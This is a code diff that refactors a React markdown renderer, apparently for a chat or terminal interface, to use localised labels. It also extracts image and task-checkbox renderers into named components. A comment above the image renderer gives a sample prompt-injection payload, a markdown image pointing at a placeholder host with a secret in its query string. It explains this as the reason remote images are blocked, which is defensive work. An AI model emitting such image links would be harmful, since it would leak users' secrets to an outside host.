@@ -4,6 +4,7 @@ import remarkGfm from 'remark-gfm';
 import { Check, Copy } from 'lucide-react';
 import { findFilePaths, type FilePathMatch } from '../../../utils/fileLinks';
 import { useOpenFile } from '../../../utils/openFile';
+import { useLabels } from '../../../labels';
 import { highlight, TOKEN_CLASS } from '../../../utils/highlight';
 
 /**
@@ -41,9 +42,10 @@ const hastText = (node: HastNode | undefined): string =>
 /** Copy button with a short "Copied" confirmation */
 export const CopyButton: React.FC<{ text: string; label?: string; className?: string }> = ({
   text,
-  label = 'Copy',
+  label,
   className = '',
 }) => {
+  const t = useLabels().terminal;
   const [copied, setCopied] = useState(false);
   const timer = useRef<number | undefined>(undefined);
   useEffect(() => () => window.clearTimeout(timer.current), []);
@@ -61,14 +63,14 @@ export const CopyButton: React.FC<{ text: string; label?: string; className?: st
         );
       }}
       className={`flex items-center gap-1 px-1.5 py-0.5 rounded text-[11px] text-gray-400 hover:text-white hover:bg-gray-800 ${focusRing} ${className}`}
-      aria-label={copied ? 'Copied' : label}
+      aria-label={copied ? t.copied : (label ?? t.copy)}
     >
       {copied ? (
         <Check size={12} aria-hidden className="text-emerald-400" />
       ) : (
         <Copy size={12} aria-hidden />
       )}
-      {copied ? 'Copied' : label}
+      {copied ? t.copied : (label ?? t.copy)}
     </button>
   );
 };
@@ -87,7 +89,7 @@ const CodeBlock: React.FC<React.ComponentProps<'pre'> & ExtraProps> = ({ node })
     <div className="my-2.5 rounded-md border border-gray-800 bg-gray-950 overflow-hidden">
       <div className="flex items-center gap-2 h-7 pl-3 pr-1 border-b border-gray-800 bg-gray-900/70">
         <span className="font-mono text-[11px] text-gray-400">{language || 'text'}</span>
-        <CopyButton text={text} label="Copy" className="ml-auto" />
+        <CopyButton text={text} className="ml-auto" />
       </div>
       <pre className="p-3 overflow-x-auto text-xs leading-relaxed text-gray-200">
         <code className={`font-mono${language ? ` language-${language}` : ''}`}>
@@ -113,6 +115,7 @@ const CodeBlock: React.FC<React.ComponentProps<'pre'> & ExtraProps> = ({ node })
 const InlineCode: React.FC<{ children?: React.ReactNode }> = ({ children }) => {
   const cwd = useContext(ChatFileContext);
   const openFile = useOpenFile();
+  const t = useLabels().terminal;
   const text = typeof children === 'string' ? children : '';
   const match = cwd && openFile ? wholeFilePath(text) : null;
   const base = 'font-mono text-[0.85em] px-1 py-0.5 rounded bg-gray-800/80 text-pink-200';
@@ -120,7 +123,7 @@ const InlineCode: React.FC<{ children?: React.ReactNode }> = ({ children }) => {
   return (
     <code
       className={`${base} cursor-pointer decoration-pink-300/40 decoration-dotted underline-offset-2 hover:underline`}
-      title={`${MOD}-click: open in VS Code`}
+      title={t.modClickOpen(MOD)}
       onClick={(e) => {
         if (!(e.metaKey || e.ctrlKey)) return;
         e.preventDefault();
@@ -146,6 +149,7 @@ const Link: React.FC<React.AnchorHTMLAttributes<HTMLAnchorElement> & ExtraProps>
 }) => {
   const cwd = useContext(ChatFileContext);
   const openFile = useOpenFile();
+  const t = useLabels().terminal;
   const match = cwd && href && !URL_SCHEME_RE.test(href) ? wholeFilePath(decodeURI(href)) : null;
   if (match && !openFile) return <>{children}</>;
   if (match && cwd && openFile)
@@ -153,7 +157,7 @@ const Link: React.FC<React.AnchorHTMLAttributes<HTMLAnchorElement> & ExtraProps>
       <a
         href={href}
         className="text-blue-300 underline decoration-blue-300/40 hover:text-blue-200"
-        title={`Open in VS Code (${MOD}+Shift: default app)`}
+        title={t.openInVsCodeMod(MOD)}
         onClick={(e) => {
           e.preventDefault();
           void openFile(match.path, cwd, {
@@ -179,6 +183,37 @@ const Link: React.FC<React.AnchorHTMLAttributes<HTMLAnchorElement> & ExtraProps>
   );
 };
 
+/** No remote image loads: a prompt-injected ![](https://host/?q=<secret>) would leak data */
+const MarkdownImage: React.FC<React.ImgHTMLAttributes<HTMLImageElement> & ExtraProps> = ({
+  alt,
+  src,
+}) => {
+  const t = useLabels().terminal;
+  return (
+    <span className="text-gray-400" title={typeof src === 'string' ? src : undefined}>
+      {t.imagePlaceholder(alt)}
+    </span>
+  );
+};
+
+/** GFM task list boxes are read-only state */
+const TaskBox: React.FC<React.InputHTMLAttributes<HTMLInputElement> & ExtraProps> = ({
+  checked,
+  type,
+}) => {
+  const t = useLabels().terminal;
+  return type === 'checkbox' ? (
+    <input
+      type="checkbox"
+      checked={!!checked}
+      readOnly
+      disabled
+      aria-label={checked ? t.taskDone : t.taskOpen}
+      className="mt-[0.3em] shrink-0 accent-blue-500"
+    />
+  ) : null;
+};
+
 /** GFM rendered with Tailwind classes (no typography plugin in this app) */
 const components: Components = {
   h1: ({ node: _n, ...p }) => (
@@ -194,12 +229,7 @@ const components: Components = {
     <h3 className="text-sm font-semibold text-gray-100 mt-4 mb-1.5" {...p} />
   ),
   h4: ({ node: _n, ...p }) => <h4 className="text-sm font-medium text-gray-200 mt-3 mb-1" {...p} />,
-  // No remote image loads: a prompt-injected ![](https://host/?q=<secret>) would leak data
-  img: ({ alt, src }) => (
-    <span className="text-gray-400" title={typeof src === 'string' ? src : undefined}>
-      [image{alt ? `: ${alt}` : ''}]
-    </span>
-  ),
+  img: MarkdownImage,
   p: ({ node: _n, ...p }) => <p className="my-2 leading-relaxed" {...p} />,
   ul: ({ node: _n, className, ...p }) => (
     <ul
@@ -222,18 +252,7 @@ const components: Components = {
       {...p}
     />
   ),
-  // GFM task list boxes are read-only state
-  input: ({ node: _n, checked, type }) =>
-    type === 'checkbox' ? (
-      <input
-        type="checkbox"
-        checked={!!checked}
-        readOnly
-        disabled
-        aria-label={checked ? 'Done' : 'Open'}
-        className="mt-[0.3em] shrink-0 accent-blue-500"
-      />
-    ) : null,
+  input: TaskBox,
   a: Link,
   blockquote: ({ node: _n, ...p }) => (
     <blockquote className="my-2 pl-3 border-l-2 border-gray-700 text-gray-300" {...p} />
